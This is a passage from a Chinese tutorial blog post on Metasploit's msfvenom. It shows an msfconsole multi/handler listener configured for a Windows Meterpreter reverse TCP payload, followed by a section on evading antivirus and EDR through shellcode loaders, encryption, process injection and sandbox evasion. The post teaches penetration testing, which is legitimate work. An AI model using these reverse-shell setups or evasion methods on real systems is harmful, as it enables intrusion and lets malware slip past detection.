<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.1.100</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li>
</ol>
<p>当目标机器执行 <code>beacon.exe</code> 后，<code>msfconsole</code> 中的监听器就会接收到连接，并建立 Meterpreter 会话。</p>
<h2 id="六、免杀与规避检测"><a href="#六、免杀与规避检测" class="headerlink" title="六、免杀与规避检测"></a>六、免杀与规避检测</h2><p>虽然 <code>msfvenom</code> 提供了编码器和模板注入等功能，但现代杀毒软件和 EDR (Endpoint Detection and Response) 系统越来越智能，仅依靠 <code>msfvenom</code> 进行免杀会越来越困难。</p>
<ul>
<li><strong>限制</strong>：<ul>
<li><strong>签名检测</strong>：高级杀软可以识别编码后的已知 Payload 签名。</li>
<li><strong>行为检测</strong>：恶意文件在执行时的行为（如反向连接、进程注入）很快会被检测到。</li>
</ul>
</li>
<li><strong>更高级的免杀技术</strong>：<ul>
<li><strong>自定义 Shellcode Loader</strong>：编写自己的 C&#x2F;C++ 程序加载 Shellcode，而不是直接生成 EXE。</li>
<li><strong>加密和混淆</strong>：使用强加密算法对 Shellcode 进行加密，在运行时才解密执行。</li>
<li><strong>进程注入&#x2F;内存执行</strong>：尽量避免将恶意代码写入磁盘。</li>
<li><strong>沙箱逃逸</strong>：检测是否在沙箱环境中运行。</li>
<li><strong>利用合法进程</strong>：将恶意逻辑注入到合法的操作系统进程中。</li>
</ul>
</li>
</ul>
<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p><code>msfvenom</code> 是 Metasploit 框架中一个极其重要的工具，它为渗透测试人员提供了灵活、高效的恶意载荷生成和编码能力。无论是快速创建后门、测试特定漏洞还是尝试绕过安全防护，<code>msfvenom</code> 都是一个不可或缺的利器。然而，随着安全防护技术的不断发展，仅仅依赖 <code>msfvenom</code> 的内置编码器来进行免杀已经远远不够。要实现更高级的规避检测，需要结合其他自定义的免杀技术和对目标系统深入的理解。正确而负责地使用 <code>msfvenom</code>，是每位安全专业人士的职责。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg">TeaTang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.tbf1211.xx.kg/2025/2025-01-26_Msfvenom%20%E8%AF%A6%E8%A7%A3/">https://blog.tbf1211.xx.kg/2025/2025-01-26_Msfvenom%20%E8%AF%A6%E8%A7%A3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.tbf1211.xx.kg" target="_blank">1024 维度</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/2025/">2025</a><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/Msfvenom/">Msfvenom</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/default_cover-15.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/2025-01-27_Prometheus%E4%B8%8EGrafana%E8%AF%A6%E8%A7%A3%EF%BC%9A%E7%8E%B0%E4%BB%A3%E7%9B%91%E6%8E%A7%E7%9A%84%E9%BB%84%E9%87%91%E7%BB%84%E5%90%88/" title="Prometheus与Grafana详解：现代监控的黄金组合"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Prometheus与Grafana详解：现代监控的黄金组合</div></div><div class="info-2"><div class="info-item-1"> 在现代复杂的 IT 基础设施中，如何高效、准确地监控系统和应用的健康状况，并及时发现潜在问题，是运维和开发团队面临的巨大挑战。Prometheus 和 Grafana 正是为此而生的一对黄金搭档。Prometheus 负责数据的收集、存储和查询，而 Grafana 则负责数据的可视化和告警展示。它们共同构建了一个强大的开源监控解决方案，已成为云原生时代监控领域的事实标准。  “没有监控的系统就像在黑暗中航行的船只，随时可能触礁。”   一、Prometheus 详解1.1 Prometheus 是什么？Prometheus 是一个开源的时间序列数据库 (TSDB) 和监控系统，由 SoundCloud 公司开发并于 2016 年加入云原生计算基金会 (CNCF)，是其第二个毕业项目。它采用了一种拉取 (Pull) 模型来收集指标数据，并通过强大的多维度数据模型和灵活的查询语言 (PromQL) 来支持复杂的告警和分析。 1.2 Prometheus 的核心特点与优势 多维数据模型：所有指标都是以时间戳和键值对（称为标签或 labels）的形式存储的。例如，http_reques...</div></div></div></a><a class="pagination-related" href="/2025/2025-01-18_Metasploit%20%E6%A1%86%E6%9E%B6%E8%AF%A6%E8%A7%A3/" title="Metasploit 框架详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-11.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Metasploit 框架详解</div></div><div class="info-2"><div class="info-item-1"> Metasploit 框架 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。  核心思想：将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。   一、Metasploit 简介1.1 什么是 Metasploit？Metasploit 是由 Rapid7 公司维护的一个著名的开源项目。它是一个漏洞利用框架，旨在协助渗透测试人员识别、利用和验证漏洞。它不仅仅是一个简单的漏洞扫描器，更是一个提供多种工具和方法的集成环境，几乎覆盖了渗透测试的整个生命周期。 1.2 Metasploit 的发展历史 2003年：由 H.D. Moore 发起，最初是一个 Perl 语言的项目。 2004年：发布 2.0 版本，首次引入了模块化架构。 2007年：框架被重写，使用 Ruby 语言，提高了灵活性和可维护性。 209年：Rapid7 收购 Metasploit 项目，并继续其开发...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/2025-01-18_Metasploit%20%E6%A1%86%E6%9E%B6%E8%AF%A6%E8%A7%A3/" title="Metasploit 框架详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-11.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-18</div><div class="info-item-2">Metasploit 框架详解</div></div><div class="info-2"><div class="info-item-1"> Metasploit 框架 是一个广为人知且功能强大的开源渗透测试工具。它提供了一个全面的平台，用于开发、测试和执行漏洞利用（exploit）。无论是安全研究人员、渗透测试工程师还是红队成员，Metasploit 都是他们工具箱中不可或缺的一部分。  核心思想：将漏洞利用、载荷生成、后渗透模块等功能模块化，提供统一的接口和工具链，简化复杂的渗透测试流程。   一、Metasploit 简介1.1 什么是 Metasploit？Metasploit 是由 Rapid7 公司维护的一个著名的开源项目。它是一个漏洞利用框架，旨在协助渗透测试人员识别、利用和验证漏洞。它不仅仅是一个简单的漏洞扫描器，更是一个提供多种工具和方法的集成环境，几乎覆盖了渗透测试的整个生命周期。 1.2 Metasploit 的发展历史 2003年：由 H.D. Moore 发起，最初是一个 Perl 语言的项目。 2004年：发布 2.0 版本，首次引入了模块化架构。 2007年：框架被重写，使用 Ruby 语言，提高了灵活性和可维护性。 209年：Rapid7 收购 Metasploit 项目，并继续其开发...</div></div></div></a><a class="pagination-related" href="/2025/2025-02-14_Metasploit%20exploit-multi-handler%20%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3/" title="Metasploit exploit&#x2F;multi&#x2F;handler 模块详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-01.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-14</div><div class="info-item-2">Metasploit exploit&#x2F;multi&#x2F;handler 模块详解</div></div><div class="info-2"><div class="info-item-1"> exploit/multi/handler 是 Metasploit 框架中一个极其重要且应用广泛的模块。它本身并不是一个漏洞利用模块，而是一个通用的监听器（Listener），用于接收由 Metasploit 或 msfvenom 生成的各种 Payload 发起的反向连接（Reverse Shell）。它提供了一个灵活且强大的平台，用于管理渗透测试过程中获取的 Shell 会话，特别是 Meterpreter 会话。  核心思想：提供一个通用的、模块化的监听接口，等待远程目标系统主动连接，从而建立一个控制通道。它与用于生成Payload的msfvenom紧密配合，实现无缝的端到端攻击链。   一、exploit/multi/handler 简介1.1 什么是 exploit/multi/handler？exploit/multi/handler 是 Metasploit 中的一个混合型模块 (Auxiliary&#x2F;Exploit)。它被归类为 exploit，因为它最终目的是“利用”系统并获得 Shell，但它实际上不包含任何漏洞利用代码。它的主要功能是：  监听反...</div></div></div></a><a class="pagination-related" href="/2025/2025-02-07_Reverse%20TCP%20Shell%20%E8%AF%A6%E8%A7%A3/" title="Reverse TCP Shell 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-03.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-07</div><div class="info-item-2">Reverse TCP Shell 详解</div></div><div class="info-2"><div class="info-item-1"> Reverse TCP Shell (反向 TCP Shell) 是一种在渗透测试和恶意软件领域中广泛使用的技术，它允许攻击者在受害机器上获得一个交互式命令行会话。与传统的正向连接 Shell (Bind Shell) 不同，反向 Shell 的连接方向是从受害机器到攻击机器，这使得它在穿越防火墙和 NAT 设备方面具有显著优势。  核心思想：攻击者在其机器上设置一个监听器，等待受害机器主动发起连接，从而绕过目标网络对入站连接的限制。   一、Shell 简介在计算机系统中，Shell (命令行解释器) 是用户与操作系统内核进行交互的接口。通过 Shell，用户可以输入命令来执行程序、管理文件和系统资源等。 在渗透测试中，获取目标系统的 Shell 权限是至关重要的一步，它意味着攻击者可以在目标机器上执行任意命令。 1.1 Shell 的分类 命令行 Shell (Command Shell)：  提供基本的命令行交互界面，如 Windows 的 cmd.exe 或 PowerShell，Linux 的 bash 或 sh。 功能相对简单，通常需要手动输入命令。   高级 Sh...</div></div></div></a><a class="pagination-related" href="/2025/2025-03-09_OAuth2.0%E8%AF%A6%E8%A7%A3%EF%BC%9A%E7%8E%B0%E4%BB%A3%E6%8E%88%E6%9D%83%E6%A1%86%E6%9E%B6%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/" title="OAuth2.0详解：现代授权框架的核心原理与应用"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-07.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">OAuth2.0详解：现代授权框架的核心原理与应用</div></div><div class="info-2"><div class="info-item-1"> OAuth 2.0（Open Authorization）是一个开放标准，定义了一套授权流程，允许用户（资源所有者）授权第三方应用访问他们在另一个服务提供者（授权服务器）上的受保护资源（资源服务器），而无需将自己的用户名和密码直接提供给第三方应用。它主要解决的是委托授权的问题，即“我授权应用A去访问我在服务B上的某些数据”。  核心区分：OAuth 2.0 是一个授权（Authorization）框架，而不是用来做认证（Authentication）。尽管它常常与认证机制（如 OpenID Connect）结合使用，但其核心职责是授予对资源的访问权限，而非验证用户身份。   一、OAuth 2.0 产生的背景与解决的问题在 OAuth 出现之前，如果一个第三方应用需要访问用户在其他服务（如 Google 相册、GitHub 代码库）上的数据，用户通常需要将自己的账号密码直接告知第三方应用。这种做法带来了严重的安全和便捷性问题：  凭据泄露风险：第三方应用一旦被攻破，或恶意使用，用户的完整凭据就会泄露，导致所有关联服务面临风险。 权限过大：第三方应用获得的是用户的完全控制权，无法...</div></div></div></a><a class="pagination-related" href="/2025/2025-03-15_%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8C%87%E7%BA%B9%20(Browser%20Fingerprinting)%20%E8%AF%A6%E8%A7%A3/" title="浏览器指纹 (Browser Fingerprinting) 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-25.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">浏览器指纹 (Browser Fingerprinting) 详解</div></div><div class="info-2"><div class="info-item-1"> 浏览器指纹 (Browser Fingerprinting) 是一种用于识别或追踪用户在线行为的技术，即使在用户清除了 cookies、使用无痕模式甚至更换 IP 地址之后，它也能尝试标识出唯一的用户或设备。与 cookies 不同，浏览器指纹不是存储在用户设备上的数据，而是通过收集用户浏览器的各种配置和设置信息来生成的。  “你的浏览器就像你的手纹一样，看似普通，却独一无二。”   一、什么是浏览器指纹？浏览器指纹是指网站或在线服务通过收集用户浏览器和设备的大量可公开信息（如操作系统、浏览器类型和版本、屏幕分辨率、字体、插件、MIME 类型、时区、语言设置、GPU 信息、Canvas 渲染结果、AudioContext 信息等），并将这些信息综合起来生成一个近似唯一的“指纹”，从而在一定概率上识别单个用户或设备的技术。 这个“指纹”的强大之处在于其持久性和隐蔽性，用户很难通过常规手段进行清除或规避。 二、浏览器指纹的工作原理网站通过 JavaScript 或其他客户端脚本，在用户访问时执行一系列操作来获取其浏览器和设备特征。这些特征包括： 1. HTTP 请求头信息 (HTT...</div></div></div></a><a class="pagination-related" href="/2025/2025-04-02_%20OAuth2.0%20PKCE%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3%EF%BC%9A%E6%8F%90%E5%8D%87%E5%85%AC%E5%85%B1%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8%E6%80%A7%E7%9A%84%E6%A0%87%E5%87%86%E5%AE%9E%E8%B7%B5/" title="OAuth2.0 PKCE机制详解：提升公共客户端安全性的标准实践"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-03.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">OAuth2.0 PKCE机制详解：提升公共客户端安全性的标准实践</div></div><div class="info-2"><div class="info-item-1"> OAuth 2.0 是当前最流行的授权协议，广泛应用于各种场景，从单一登录到第三方应用授权。其中，授权码流 (Authorization Code Flow) 被认为是安全性最高的流程，因为它避免了 Access Token 直接暴露在前端。然而，对于公共客户端 (Public Clients)，如原生移动应用 (Native Apps) 和单页应用 (SPAs)，由于它们无法像传统 Web 服务器应用那样安全地存储客户端密钥 (Client Secret)，授权码流面临着一个安全漏洞：授权码拦截攻击 (Authorization Code Interception Attack)。为了解决这一问题，RFC 7636 引入了 PKCE (Proof Key for Code Exchange) 机制，极大地提升了公共客户端使用授权码流的安全性。  “PKCE 是 OAuth 2.0 授权码流的一个关键扩展，它专门为无法保密客户端密钥的公共客户端设计。它通过一种动态生成的验证机制，有效阻止了授权码被恶意拦截后用于获取 Access Token 的风险，是现代移动应用和 SPA 采...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">TeaTang</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">190</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">168</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">58</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/teatang"><i class="fab fa-github"></i><span>GitHub主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:tea.tang1211@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站更多功能即将上线，敬请期待！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Msfvenom-%E7%AE%80%E4%BB%8B"><span class="toc-text">一、Msfvenom 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF-Msfvenom%EF%BC%9F"><span class="toc-text">1.1 什么是 Msfvenom？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-Msfvenom-%E7%9A%84%E5%89%8D%E8%BA%AB"><span class="toc-text">1.2 Msfvenom 的前身</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8-Msfvenom%EF%BC%9F"><span class="toc-text">1.3 为什么使用 Msfvenom？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Msfvenom-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E9%80%9F%E6%9F%A5"><span class="toc-text">二、Msfvenom 常用参数速查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Msfvenom-%E6%A0%B8%E5%BF%83%E6%A6%82%E5%BF%B5%E8%AF%A6%E8%A7%A3"><span class="toc-text">三、Msfvenom 核心概念详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Payload-%E8%BD%BD%E8%8D%B7"><span class="toc-text">3.1 Payload (载荷)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Encoder-%E7%BC%96%E7%A0%81%E5%99%A8"><span class="toc-text">3.2 Encoder (编码器)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-3-Format-%E8%BE%93%E5%87%BA%E6%A0%BC%E5%BC%8F"><span class="toc-text">3.3 Format (输出格式)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-Template-%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6"><span class="toc-text">3.4 Template (模板文件)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Msfvenom-%E5%B8%B8%E8%A7%81%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B"><span class="toc-text">四、Msfvenom 常见用法示例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-%E7%94%9F%E6%88%90-Windows-Meterpreter-%E5%8F%8D%E5%90%91-TCP-Shell-EXE"><span class="toc-text">4.1 生成 Windows Meterpreter 反向 TCP Shell (EXE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E7%94%9F%E6%88%90-Linux-x64-Meterpreter-%E5%8F%8D%E5%90%91-TCP-Shell-ELF"><span class="toc-text">4.2 生成 Linux x64 Meterpreter 反向 TCP Shell (ELF)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-%E7%94%9F%E6%88%90-PHP-Reverse-Shell"><span class="toc-text">4.3 生成 PHP Reverse Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-4-%E7%94%9F%E6%88%90%E7%94%A8-Shikata-Ga-Nai-%E7%BC%96%E7%A0%81%E7%9A%84-Windows-Payload"><span class="toc-text">4.4 生成用 Shikata Ga Nai 编码的 Windows Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-5-%E7%BB%95%E8%BF%87%E5%9D%8F%E5%AD%97%E7%AC%A6-Bad-Characters"><span class="toc-text">4.5 绕过坏字符 (Bad Characters)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-6-%E6%B3%A8%E5%85%A5-Payload-%E5%88%B0%E7%8E%B0%E6%9C%89-EXE-%E6%96%87%E4%BB%B6"><span class="toc-text">4.6 注入 Payload 到现有 EXE 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-7-%E7%94%9F%E6%88%90-Shellcode-C-%E8%AF%AD%E8%A8%80%E6%A0%BC%E5%BC%8F"><span class="toc-text">4.7 生成 Shellcode (C 语言格式)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E4%B8%8E-Metasploit-%E6%8E%A7%E5%88%B6%E5%8F%B0-msfconsole-%E9%85%8D%E5%90%88%E4%BD%BF%E7%94%A8"><span class="toc-text">五、与 Metasploit 控制台 (msfconsole) 配合使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%85%8D%E6%9D%80%E4%B8%8E%E8%A7%84%E9%81%BF%E6%A3%80%E6%B5%8B"><span class="toc-text">六、免杀与规避检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">七、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/2025-10-28_nftables%20%E8%AF%A6%E8%A7%A3/" title="nftables 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nftables 详解"/></a><div class="content"><a class="title" href="/2025/2025-10-28_nftables%20%E8%AF%A6%E8%A7%A3/" title="nftables 详解">nftables 详解</a><time datetime="2025-10-27T22:24:00.000Z" title="发表于 2025-10-28 06:24:00">2025-10-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/2025-10-25_iptables%20%E8%AF%A6%E8%A7%A3/" title="iptables 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="iptables 详解"/></a><div class="content"><a class="title" href="/2025/2025-10-25_iptables%20%E8%AF%A6%E8%A7%A3/" title="iptables 详解">iptables 详解</a><time datetime="2025-10-24T22:24:00.000Z" title="发表于 2025-10-25 06:24:00">2025-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/2025-10-23_Go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C%E8%AF%A6%E8%A7%A3/" title="Go语言并发与并行详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-24.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Go语言并发与并行详解"/></a><div class="content"><a class="title" href="/2025/2025-10-23_Go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C%E8%AF%A6%E8%A7%A3/" title="Go语言并发与并行详解">Go语言并发与并行详解</a><time datetime="2025-10-22T22:24:00.000Z" title="发表于 2025-10-23 06:24:00">2025-10-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/2025-10-16_%E5%B8%B8%E7%94%A8%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95%E7%9A%84Go%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%AF%A6%E8%A7%A3/" title="常用限流算法的Go语言实现详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-19.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常用限流算法的Go语言实现详解"/></a><div class="content"><a class="title" href="/2025/2025-10-16_%E5%B8%B8%E7%94%A8%E9%99%90%E6%B5%81%E7%AE%97%E6%B3%95%E7%9A%84Go%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E8%AF%A6%E8%A7%A3/" title="常用限流算法的Go语言实现详解">常用限流算法的Go语言实现详解</a><time datetime="2025-10-15T22:24:00.000Z" title="发表于 2025-10-16 06:24:00">2025-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/2025-10-10_NativeScript-Vue3%E8%AF%A6%E8%A7%A3/" title="NativeScript-Vue3详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-18.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NativeScript-Vue3详解"/></a><div class="content"><a class="title" href="/2025/2025-10-10_NativeScript-Vue3%E8%AF%A6%E8%A7%A3/" title="NativeScript-Vue3详解">NativeScript-Vue3详解</a><time datetime="2025-10-09T22:24:00.000Z" title="发表于 2025-10-10 06:24:00">2025-10-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover/default_cover-15.jpg);"><div class="footer-flex"><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">我的轨迹</div><div class="footer-flex-content"><a href="/archives/2023/" target="_blank" title="📌 2023">📌 2023</a><a href="/archives/2024/" target="_blank" title="❓ 2024">❓ 2024</a><a href="/archives/2025/" target="_blank" title="🚀 2025">🚀 2025</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">维度</div><div class="footer-flex-content"><a href="/categories/" target="_blank" title="分类">分类</a><a href="/tags/" target="_blank" title="标签">标签</a><a href="/categories/" target="_blank" title="时间线">时间线</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">其他</div><div class="footer-flex-content"><a href="/shuoshuo" target="_blank" title="说说">说说</a></div></div></div></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2021 - 2025 By TeaTang</span><span class="framework-info"><span class="footer-separator">|</span><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

